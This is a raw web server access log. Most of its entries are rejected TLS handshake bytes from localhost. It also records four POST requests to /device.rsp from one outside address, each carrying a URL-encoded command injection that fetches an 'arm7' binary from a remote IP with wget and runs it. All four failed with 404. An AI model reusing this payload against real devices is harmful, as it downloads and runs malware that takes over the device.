127.0.0.1 - - [18/Feb/2025:22:34:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:41:48 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:22:44:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:44:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:47:23 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [18/Feb/2025:22:49:39 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
43.157.150.69 - - [18/Feb/2025:22:51:33 +0300] "GET / HTTP/1.1" 200 68984
127.0.0.1 - - [18/Feb/2025:22:54:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:54:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:54:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:54:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
70.30.114.103 - - [18/Feb/2025:22:55:24 +0300] "GET / HTTP/1.0" 200 66938
91.224.92.10 - - [18/Feb/2025:22:55:55 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:55:56 +0300] "\x16\x03\x01\x07" 400 226
